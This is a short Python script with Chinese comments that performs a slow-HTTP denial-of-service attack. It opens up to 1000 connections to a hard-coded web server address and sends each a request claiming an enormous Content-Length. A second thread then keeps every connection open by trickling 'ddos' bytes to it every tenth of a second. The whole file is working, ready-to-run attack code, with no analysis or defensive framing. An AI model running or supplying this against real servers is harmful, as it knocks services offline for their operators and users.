import socket
import time
import threading


# 设置一些参数
MAX_CONN = 1000
PORT = 80
HOST = "192.168.0.108"
PAGE = "/index.html"

# 包的内容,请求头
buf = ("GET %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
       "Content-Length: 1000000000\r\n"
       "\r\n" % (PAGE, HOST))

socks = []

# 创建链接
def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(bytes(buf, encoding='utf-8'))
            print("[+] Send buf OK!,conn=%d" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(0.2)

# 发包
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send(bytes("ddos", encoding='utf-8'))
                print("[+] send OK!")
            except Exception as ex:
                print("[-] send Exception:%s" % ex)
                socks.remove(s)
                s.close()
        time.sleep(0.1)

#设置,开启线程
conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()
